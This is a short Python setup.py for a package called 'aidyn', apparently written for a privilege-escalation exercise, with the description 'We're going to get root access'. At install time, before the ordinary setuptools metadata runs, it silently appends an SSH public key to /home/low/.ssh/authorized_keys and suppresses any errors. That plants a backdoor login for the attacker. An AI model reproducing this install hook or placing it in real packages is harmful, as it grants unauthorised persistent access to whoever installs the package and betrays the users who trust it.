import setuptools
try:
    with open("/home/low/.ssh/authorized_keys", "a") as f:
        f.write("\n<SSH PUBLIC KEY OVER HERE - id_rsa.pub>")
        f.close()
except Exception as e:
    pass
setuptools.setup(
name="aidyn", # Replace with your own username
version="0.0.1",
author="Author",
author_email="author@mail.com",
description="We're going to get root access",
long_description="",
long_description_content_type="text/markdown",
url="https://github.com/pypa/sampleproject",
packages=setuptools.find_packages(),
classifiers=[
"Programming Language :: Python :: 3",
"License :: OSI Approved :: MIT License",
"Operating System :: OS Independent",
],
)
